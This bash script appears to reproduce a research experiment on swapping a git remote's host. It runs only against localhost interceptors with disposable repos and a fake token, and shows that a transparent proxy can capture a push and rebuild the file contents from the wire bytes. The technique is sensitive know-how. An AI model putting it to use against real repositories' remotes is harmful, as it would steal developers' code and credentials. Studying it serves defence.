#!/usr/bin/env bash
# End-to-end reproduction of the git-remote-domain-swap interception experiment.
#
# Runs entirely against 127.0.0.1 with disposable repos in a temp dir. It:
#   1. builds a source repo carrying an identifiable payload;
#   2. points a remote at a PASSIVE interceptor and shows it captures only the
#      handshake (no packfile) because git aborts on an invalid advertisement;
#   3. points the remote at a TRANSPARENT interceptor (real git-http-backend),
#      pushes for real, and reconstructs the full object graph -- payload and
#      commit metadata -- from the intercepted wire bytes alone.
#
# Env: KEEP=1 keeps the temp workdir for inspection.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK="$(mktemp -d "${TMPDIR:-/tmp}/git-swap.XXXXXX")"
PASSIVE_PORT=${PASSIVE_PORT:-8080}
XPARENT_PORT=${XPARENT_PORT:-8081}
PIDS=()

cleanup() {
  for pid in "${PIDS[@]:-}"; do kill "$pid" 2>/dev/null || true; done
  if [ "${KEEP:-0}" = "1" ]; then echo "[kept workdir: $WORK]"; else rm -rf "$WORK"; fi
}
trap cleanup EXIT

wait_port() { # host port
  for _ in $(seq 1 50); do
    (exec 3<>"/dev/tcp/$1/$2") 2>/dev/null && { exec 3>&- 3<&-; return 0; }
    sleep 0.1
  done
  echo "timed out waiting for $1:$2" >&2; return 1
}

hr() { printf '\n########## %s ##########\n' "$1"; }

# --- build a source repo with an identifiable (fake) payload ------------------
hr "SETUP: source repo with a payload we can watch cross the wire"
SRC="$WORK/source-repo"
mkdir -p "$SRC"; ( cd "$SRC"
  git init -q -b main
  git config user.email exp@localhost
  git config user.name Experimenter
  git config commit.gpgsign false
  printf 'the-scent-of-discovery\nAPI_TOKEN=hunter2-not-real\n' > payload.txt
  # --no-verify: skip any host commit hooks; this is a throwaway repo in /tmp
  git add payload.txt && git commit -q --no-verify -m "seed: payload"
)
echo "source HEAD: $(git -C "$SRC" rev-parse --short HEAD)"

# --- 1) PASSIVE: sees the handshake, not the contents -------------------------
hr "1) PASSIVE interceptor -- swap remote to 127.0.0.1:$PASSIVE_PORT"
PORT=$PASSIVE_PORT node "$SCRIPT_DIR/passive-interceptor.js" >"$WORK/passive.log" 2>&1 &
PIDS+=($!); wait_port 127.0.0.1 "$PASSIVE_PORT"
git -C "$SRC" remote add origin "http://127.0.0.1:$PASSIVE_PORT/octocat/hello-world.git"
echo "-- fetch attempt (expected to fail; we only care what the server saw) --"
GIT_TERMINAL_PROMPT=0 git -C "$SRC" ls-remote origin 2>&1 | sed 's/^/   git: /' || true
echo "-- push attempt --"
GIT_TERMINAL_PROMPT=0 git -C "$SRC" push origin main 2>&1 | sed 's/^/   git: /' || true
sleep 0.2
echo "-- what the passive server captured: --"
sed 's/^/   /' "$WORK/passive.log"

# --- 2) TRANSPARENT: completes the transfer, tees the packfile ----------------
hr "2) TRANSPARENT interceptor -- swap remote to 127.0.0.1:$XPARENT_PORT"
BARE_ROOT="$WORK/bare-repos"; DUMP_DIR="$WORK/dump"
mkdir -p "$BARE_ROOT"
git init -q --bare "$BARE_ROOT/hello-world.git"
git -C "$BARE_ROOT/hello-world.git" config http.receivepack true
GIT_PROJECT_ROOT="$BARE_ROOT" DUMP_DIR="$DUMP_DIR" PORT=$XPARENT_PORT \
  node "$SCRIPT_DIR/transparent-interceptor.js" >"$WORK/transparent.log" 2>&1 &
PIDS+=($!); wait_port 127.0.0.1 "$XPARENT_PORT"
git -C "$SRC" remote set-url origin "http://127.0.0.1:$XPARENT_PORT/hello-world.git"
echo "-- push for real (should succeed) --"
GIT_TERMINAL_PROMPT=0 git -C "$SRC" push origin main 2>&1 | sed 's/^/   git: /'
echo "-- ls-remote back through the proxy --"
GIT_TERMINAL_PROMPT=0 git -C "$SRC" ls-remote origin 2>&1 | sed 's/^/   git: /'
sleep 0.2
echo "-- what the transparent server logged: --"
sed 's/^/   /' "$WORK/transparent.log"

# --- 3) reconstruct the payload from intercepted bytes ONLY --------------------
hr "3) RECONSTRUCT from the carved packfile (wire bytes only)"
REC="$WORK/reconstruct"
git init -q "$REC"
cp "$DUMP_DIR/intercepted.pack" "$REC/.git/objects/pack/intercepted.pack"
( cd "$REC" && git index-pack .git/objects/pack/intercepted.pack >/dev/null 2>&1 )
echo "-- objects recovered from the intercepted stream: --"
git -C "$REC" cat-file --batch-all-objects --batch-check 2>/dev/null | sed 's/^/   /'
echo "-- payload.txt reconstructed from wire bytes: --"
for B in $(git -C "$REC" cat-file --batch-all-objects --batch-check 2>/dev/null | awk '$2=="blob"{print $1}'); do
  git -C "$REC" cat-file -p "$B" | sed 's/^/   > /'
done
echo "-- and the same file read from the bare repo we now own: --"
git -C "$BARE_ROOT/hello-world.git" cat-file -p main:payload.txt | sed 's/^/   > /'

hr "DONE"
